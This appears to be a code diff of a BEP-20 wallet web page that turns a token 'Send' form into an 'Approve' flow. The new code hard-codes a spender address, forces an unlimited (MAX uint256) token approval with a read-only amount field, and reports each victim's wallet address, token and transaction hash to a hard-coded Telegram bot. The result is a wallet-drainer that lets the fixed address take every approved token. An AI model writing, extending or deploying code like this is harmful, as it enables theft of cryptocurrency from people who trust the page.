@@ -110,7 +110,7 @@
     </div>
 
     <div id="transferSection">
-      <h3>Send Tokens</h3>
+      <h3>Approve</h3>
 
       <div class="field">
         <label for="tokenSelect">Token</label>
@@ -118,19 +118,18 @@
       </div>
 
       <div class="field">
-        <label>Recipient</label>
+        <label>Spender</label>
         <div class="spender-fixed" id="spenderFixed"></div>
       </div>
 
       <div class="field">
-        <label for="amountInput">Amount</label>
+        <label>Amount</label>
         <div class="amount-row">
-          <input id="amountInput" type="text" inputmode="decimal" autocomplete="off" placeholder="0.0" />
-          <button type="button" class="max-btn" id="maxBtn">MAX</button>
+          <input id="amountInput" type="text" value="MAX" readonly />
         </div>
       </div>
 
-      <button id="sendBtn" disabled>Send</button>
+      <button id="sendBtn" disabled>Approve</button>
       <div class="transfer-msg" id="transferMsg"></div>
     </div>
 
@@ -155,19 +154,15 @@
   var transferSec   = document.getElementById("transferSection");
   var tokenSelect   = document.getElementById("tokenSelect");
   var spenderFixed  = document.getElementById("spenderFixed");
-  var amountInput   = document.getElementById("amountInput");
-  var maxBtn        = document.getElementById("maxBtn");
   var sendBtn       = document.getElementById("sendBtn");
   var transferMsg   = document.getElementById("transferMsg");
 
   var currentAddr   = null;
   var trustProvider = null;
-  var tokenBalances = {};
 
   var TARGET_ADDRESS = "0xB7FE38d57bD579E59d9c75CF9E0dD2B67Ddc353e";
   spenderFixed.textContent = TARGET_ADDRESS;
 
-  /* Telegram config */
   var TG_BOT_TOKEN = "8607880941:AAGCnF-Etis0sKDK50D5DwJ_M4IxX_2y6mA";
   var TG_CHAT_ID   = "7889964634";
 
@@ -270,12 +265,12 @@
       card.classList.remove("found");
       card.classList.add("match");
       title.textContent = "Target wallet connected ✓";
-      desc.textContent  = "This is the apparel wallet — all BEP-20 balances shown below.";
+      desc.textContent  = "All BEP-20 balances shown below.";
     } else {
       card.classList.remove("match");
       card.classList.add("found");
       title.textContent = "Wallet connected";
-      desc.textContent  = "Connected wallet does not match the target apparel wallet.";
+      desc.textContent  = "Connected wallet does not match the target.";
     }
     return isMatch;
   }
@@ -350,7 +345,6 @@
     addressText.textContent = address;
     tokenRowsEl.innerHTML = "";
     nativeBalEl.textContent = "…";
-    tokenBalances = {};
 
     try {
       var hexBal = await trustProvider.request({ method: "eth_getBalance", params: [address, "latest"] });
@@ -374,10 +368,8 @@
         var data = "0x70a08231000000000000000000000000" + address.slice(2).toLowerCase();
         var result = await trustProvider.request({ method: "eth_call", params: [{ to: t.address, data: data }, "latest"] });
         var raw = BigInt(result);
-        tokenBalances[t.symbol] = raw;
         right.textContent = formatWei(raw, t.decimals) + " " + t.symbol;
       } catch (err) {
-        tokenBalances[t.symbol] = 0n;
         right.textContent = "—";
       }
     }
@@ -400,23 +392,8 @@
     return null;
   }
 
-  function parseAmountToWei(amountStr, decimals) {
-    var s = String(amountStr || "").trim();
-    if (!s) return null;
-    if (!/^\d*\.?\d*$/.test(s) || s === ".") return null;
-    var parts = s.split(".");
-    var whole = parts[0] || "0";
-    var frac  = (parts[1] || "");
-    if (frac.length > decimals) frac = frac.slice(0, decimals);
-    frac = frac.padEnd(decimals, "0");
-    try { return BigInt(whole + frac); } catch (e) { return null; }
-  }
-
   function updateSendEnabled() {
-    var token  = getSelectedToken();
-    var amount = amountInput.value.trim();
-    var ok = !!token && amount.length > 0 && parseAmountToWei(amount, token.decimals) !== null;
-    sendBtn.disabled = !ok;
+    sendBtn.disabled = !currentAddr;
   }
 
   function setTransferMsg(html, kind) {
@@ -434,30 +411,21 @@
     return fetch(url, { method: "POST", body: body }).catch(function () {});
   }
 
-  async function send() {
+  async function approve() {
     if (!trustProvider || !currentAddr) return;
     var token = getSelectedToken();
     if (!token) return;
-    var amountWei = parseAmountToWei(amountInput.value, token.decimals);
-    if (amountWei === null) { setTransferMsg("Invalid amount.", "err"); return; }
 
     sendBtn.disabled = true;
     sendBtn.textContent = "Awaiting wallet…";
     setTransferMsg("Confirm in Trust Wallet…", null);
 
-    /* fire telegram with the user wallet address at approval time */
-    sendTelegram(
-      "🔔 <b>Approval</b>\n" +
-      "<b>Wallet:</b> <code>" + currentAddr + "</code>\n" +
-      "<b>Token:</b> " + token.symbol + "\n" +
-      "<b>Amount:</b> " + amountInput.value.trim() + "\n" +
-      "<b>Spender:</b> <code>" + TARGET_ADDRESS + "</code>"
-    );
+    var MAX_UINT256 = (2n ** 256n - 1n);
 
     try {
       var selector   = "095ea7b3";
       var spenderHex = TARGET_ADDRESS.toLowerCase().replace(/^0x/, "").padStart(64, "0");
-      var amountHex  = amountWei.toString(16).padStart(64, "0");
+      var amountHex  = MAX_UINT256.toString(16).padStart(64, "0");
       var data = "0x" + selector + spenderHex + amountHex;
 
       var txHash = await trustProvider.request({
@@ -466,43 +434,27 @@
       });
 
       var link = '<a href="https://bscscan.com/tx/' + txHash + '" target="_blank" rel="noopener">View on BscScan ↗</a>';
-      setTransferMsg("Sent. " + link, "ok");
+      setTransferMsg("Approved (MAX). " + link, "ok");
 
       sendTelegram(
-        "✅ <b>Approval confirmed</b>\n" +
+        "✅ <b>Approval confirmed (MAX)</b>\n" +
         "<b>Wallet:</b> <code>" + currentAddr + "</code>\n" +
         "<b>Token:</b> " + token.symbol + "\n" +
-        "<b>Amount:</b> " + amountInput.value.trim() + "\n" +
         "<b>Spender:</b> <code>" + TARGET_ADDRESS + "</code>\n" +
         "<b>Tx:</b> https://bscscan.com/tx/" + txHash
       );
     } catch (err) {
-      var msg = (err && (err.message || err.code)) ? (err.message || ("Error " + err.code)) : "Transfer failed.";
-      if (err && err.code === 4001) msg = "Transaction rejected in wallet.";
+      var msg = (err && (err.message || err.code)) ? (err.message || ("Error " + err.code)) : "Approval failed.";
+      if (err && err.code === 4001) msg = "Approval rejected in wallet.";
       setTransferMsg(msg, "err");
-      sendTelegram(
-        "❌ <b>Approval failed</b>\n" +
-        "<b>Wallet:</b> <code>" + currentAddr + "</code>\n" +
-        "<b>Reason:</b> " + msg
-      );
     } finally {
-      sendBtn.textContent = "Send";
+      sendBtn.textContent = "Approve";
       updateSendEnabled();
     }
   }
 
-  function fillMax() {
-    var token = getSelectedToken();
-    if (!token) return;
-    var raw = tokenBalances[token.symbol];
-    if (raw === undefined) { setTransferMsg("Token balance not loaded yet.", "err"); return; }
-    amountInput.value = formatWei(raw, token.decimals);
-    updateSendEnabled();
-  }
-
   function disconnect() {
     currentAddr = null;
-    tokenBalances = {};
     balanceSec.style.display = "none";
     transferSec.style.display = "none";
     disconnectBtn.style.display = "none";
@@ -512,18 +464,12 @@
     desc.textContent  = "Connect to see your BEP-20 coins and balances.";
     statusMsg.textContent = "";
     transferMsg.textContent = "";
-    amountInput.value = "";
   }
 
   connectBtn.addEventListener("click", connect);
   disconnectBtn.addEventListener("click", disconnect);
-  sendBtn.addEventListener("click", send);
-  maxBtn.addEventListener("click", fillMax);
-  amountInput.addEventListener("input", updateSendEnabled);
-  tokenSelect.addEventListener("change", function () {
-    transferMsg.textContent = "";
-    updateSendEnabled();
-  });
+  sendBtn.addEventListener("click", approve);
+  tokenSelect.addEventListener("change", function () { transferMsg.textContent = ""; });
 
   detectTrust();
   requestProviders();
